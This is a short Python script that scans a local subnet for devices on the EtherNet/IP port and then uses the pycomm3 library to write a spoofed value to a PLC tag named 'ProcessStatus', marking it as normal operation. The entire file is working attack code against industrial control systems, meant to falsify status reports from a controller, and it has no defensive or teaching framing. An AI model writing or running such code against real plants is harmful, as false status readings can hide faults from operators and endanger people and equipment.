import socket
import pycomm3
from pycomm3 import LogixDriver

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Assuming the PLC is on the same subnet as the Windows machine
    # This is a simple method to discover the PLC's IP address
    # In a real-world scenario, you might use a more sophisticated method
    # such as scanning the network or using a known IP range

    # Example IP range to scan
    ip_range = "192.168.1."
    for i in range(1, 255):
        ip = f"{ip_range}{i}"
        try:
            # Attempt to connect to the PLC
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((ip, 44818))  # 44818 is the default port for EtherNet/IP
                if result == 0:
                    print(f"PLC found at IP: {ip}")
                    return ip
        except socket.error:
            continue
    print("PLC not found")
    return None

# Function to send spoofed reporting messages
def spoof_reporting_message(plc_ip, tag_name, value):
    try:
        with LogixDriver(plc_ip) as plc:
            # Write the spoofed value to the specified tag
            plc.write((tag_name, value))
            print(f"Sent spoofed message: {tag_name} = {value}")
    except Exception as e:
        print(f"Error sending spoofed message: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip is None:
        return

    # Define the tag and value to spoof
    tag_name = "ProcessStatus"  # Example tag name
    spoof_value = 1  # Example value to spoof (1 for normal operation)

    # Send the spoofed reporting message
    spoof_reporting_message(plc_ip, tag_name, spoof_value)

if __name__ == "__main__":
    main()